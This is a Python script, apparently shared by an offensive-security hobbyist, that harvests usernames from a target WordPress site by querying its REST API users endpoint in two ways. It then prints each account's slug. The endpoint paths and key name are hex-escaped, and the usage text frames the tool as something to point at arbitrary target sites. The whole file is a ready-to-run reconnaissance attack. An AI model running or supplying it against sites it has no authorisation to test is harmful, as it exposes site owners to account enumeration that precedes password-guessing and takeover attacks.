# Author : ABDO10_DZ
# Tool : Automated Wordpress Users enumerator - with : rest_user
import requests
import sys

# colors to make good visible result to ur eyes , lol :) 
blue = '\033[1;32;34m'
green = '\033[1;32;40m'
red = '\033[1;32;31m'
end = '\033[0m'

def help():
	print("{}[methods]:{} 0/1/all".format(blue,end))
	print("{}[Usage]:{} python {} http://www.target.com/[path_to_WP] <method>".format(blue,end,sys.argv[0]))
	print("{}[Example]:{} {} http://www.target.com/wp 0".format(green,end,sys.argv[0]))
def takeitout(target):
	try:
		res = requests.get(target)
	except Exception as e:
		print("[{}-{}] Connection Failed , Exception Error:{}{}{}".format(red,end,red,e,end))
		return 1
	if (res.status_code != 200):
		print("[{}-{}] die code :{}{}{}".format(red,end,red,res.status_code,end))
		return 1
	try:
		res = res.json()
	except Exception as e:
		print("[{}-{}] Failed, [WAF/NOT WP CMS] Exception Error:{}{}{}".format(red,end,red,e,end))
		return 1

	key = "\x73\x6c\x75\x67"

	for out in res:
		print("[{}+{}] Username :{}{}{}".format(green,end,green,out[key],end))

def main():
	x = 0
	#obfuscating for no resean i love'd that only
	json = "\x2f\x77\x70\x2d\x6a\x73\x6f\x6e\x2f\x77\x70\x2f\x76\x32\x2f\x75\x73\x65\x72\x73"
	rest = "\x3f\x72\x65\x73\x74\x5f\x72\x6f\x75\x74\x65\x3d\x2f\x77\x70\x2f\x76\x32\x2f\x75\x73\x65\x72\x73"
	if len(sys.argv) <= 2 :
		help()
		return 1
	else :
		target = sys.argv[1]
		method = sys.argv[2]
		if "http://" not in target and "https://" not in target:
			target = "http://" + target
	if method == "0":
		print("[{}*{}] Start enumerate on :{} using payload : {}".format(blue,end,target,json))
		takeitout(target+json)
	elif method == "1":
		print("[{}*{}] Start enumerate on :{} using payload : {}".format(blue,end,target,rest))
		takeitout(target+rest)
	elif method == "all":
		print("[{}*{}] Start enumerate on :{} using all payloads".format(blue,end,target))
		for x in range(2):
			print("\n[{}*{}] Lunching rest_user method {}".format(blue,end,x))
			if (x == 0):
				takeitout(target+json)
			else:
				takeitout(target+rest)
	else:
		print("[{}-{}] Unknown method , methods : 0/1/all".format(red,end))
		return 1

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print ('\n{}Interrupted : Quiting...{}'.format(red,end))
        sys.exit(0)
